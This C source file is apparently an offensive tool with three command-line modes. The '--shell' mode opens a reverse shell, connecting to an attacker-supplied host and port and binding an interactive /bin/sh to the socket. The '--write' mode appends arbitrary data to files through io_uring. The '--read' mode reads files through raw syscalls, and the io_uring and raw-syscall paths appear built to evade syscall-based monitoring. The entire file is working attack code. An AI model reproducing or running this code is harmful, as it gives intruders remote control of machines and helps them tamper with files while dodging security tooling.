#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

#include "../io_uring/iouring_utils.h"

static void tcp_shell(const char *host, uint16_t port)
{

    int s = (int)syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return; }

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) <= 0) {
        close(s); fprintf(stderr, "inet_pton\n"); return;
    }
    if ((int)syscall(SYS_connect, s, &sa, sizeof(sa)) < 0) {
        perror("connect"); close(s); return;
    }

    dup2(s, 0); dup2(s, 1); dup2(s, 2); close(s);
    setsid();
    char *sh[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", sh, environ);
    perror("execve");
}

static void uring_append(const char *path, const char *data)
{
    struct uring u = {};
    if (uring_init(&u, 8) < 0) { perror("uring_init"); return; }

    struct io_uring_sqe *sqe;
    struct io_uring_cqe cqe;

    sqe = uring_get_sqe(&u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = O_WRONLY | O_CREAT | O_APPEND;
    sqe->len        = 0644;
    uring_submit_wait(&u, 1); uring_peek_cqe(&u, &cqe);
    if ((int)cqe.res < 0) {
        fprintf(stderr, "open: %d\n", cqe.res); uring_free(&u); return;
    }
    int fd = (int)cqe.res;

    sqe = uring_get_sqe(&u);
    sqe->opcode = IORING_OP_WRITE; sqe->fd = fd;
    sqe->addr   = (uint64_t)(uintptr_t)data;
    sqe->len    = (uint32_t)strlen(data);
    sqe->off    = 0;
    uring_submit_wait(&u, 1); uring_peek_cqe(&u, &cqe);
    fprintf(stderr, "[write] %d bytes -> %s\n", cqe.res, path);

    sqe = uring_get_sqe(&u); sqe->opcode = IORING_OP_CLOSE; sqe->fd = fd;
    uring_submit_wait(&u, 1); uring_peek_cqe(&u, &cqe);
    uring_free(&u);
}

static void direct_read(const char *path)
{

    int fd = (int)syscall(SYS_openat, AT_FDCWD, path, O_RDONLY, 0);
    if (fd < 0) { fprintf(stderr, "open %s: %s\n", path, strerror(errno)); return; }

    char buf[65536]; ssize_t n;
    while ((n = (ssize_t)syscall(SYS_read, fd, buf, sizeof(buf))) > 0)
        (void)syscall(SYS_write, STDOUT_FILENO, buf, (size_t)n);
    syscall(SYS_close, fd);
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <--shell|--write|--read>\n", argv[0]);
        return 1;
    }
    if (!strcmp(argv[1],"--shell") && argc>=4) {
        tcp_shell(argv[2], (uint16_t)atoi(argv[3])); return 0;
    }
    if (!strcmp(argv[1],"--write") && argc>=4) {
        uring_append(argv[2], argv[3]); return 0;
    }
    if (!strcmp(argv[1],"--read")) {
        direct_read(argv[2]); return 0;
    }
    return 1;
}
